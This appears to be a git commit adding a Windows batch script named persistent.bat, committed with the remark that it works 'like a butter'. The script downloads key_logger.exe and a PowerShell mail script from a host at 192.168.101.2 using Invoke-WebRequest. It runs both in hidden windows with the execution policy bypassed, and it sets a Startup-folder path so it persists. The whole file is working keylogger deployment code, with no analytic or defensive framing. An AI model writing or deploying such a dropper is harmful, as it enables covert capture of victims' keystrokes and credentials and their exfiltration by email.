f1e259234a6ddc69b11c9d633e6cdac090c8fb24
Lupin <99235929+jitenadk@users.noreply.github.com>
2024-02-12 17:34:18 +0545

    Add files via upload
    persistent file working fine like a butter

--- persistent.bat
+++ persistent.bat
@@ -1,13 +1,30 @@
+@echo off
+setlocal
+
+set "URL=http://192.168.101.2:80"
+
+set "logger=key_logger.exe"
+set "mail=ps_mail.ps1"
+set "record=Record.txt"
+
+set "fileTemp=%TEMP%"
+set "fileStartupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\persistent.bat"
+
+if not exist "%fileTemp%\logger.exe" (
+    start powershell -Command "Invoke-WebRequest -Uri %URL%/%logger% -OutFile $env:TEMP\logger.exe"
+)
+
+if not exist "%fileTemp%\%mail%" (
+    start powershell -Command "Invoke-WebRequest -Uri %URL%/%mail% -OutFile $env:TEMP\%mail%"
+)
+
+if not exist "%fileTemp%\%record%" (
+    start powershell -Command "Invoke-WebRequest -Uri %URL%/%record% -OutFile $env:TEMP\%record%"
+)
+
+start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"
+
+start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"
 
 
-REM Make sure the Temp directory exists
-IF NOT EXIST %userprofile%\AppData\Local\Temp mkdir %userprofile%\AppData\Local\Temp
-
-REM Navigate to the Temp directory
-cd %userprofile%\AppData\Local\Temp
-
-REM Start the PowerShell script, using the appropriate interpreter
-REM (e.g. "powershell" for a PowerShell script, "python" for a Python script)
-rem start powershell -ExecutionPolicy Bypass -File .\ps_mail.ps1 -Command Start-Process 'keylogger.exe'
-start powershell -command -ExecutionPolicy Bypass "logger.exe"
-start powershell -command ".\ps_mail.ps1"
+endlocal
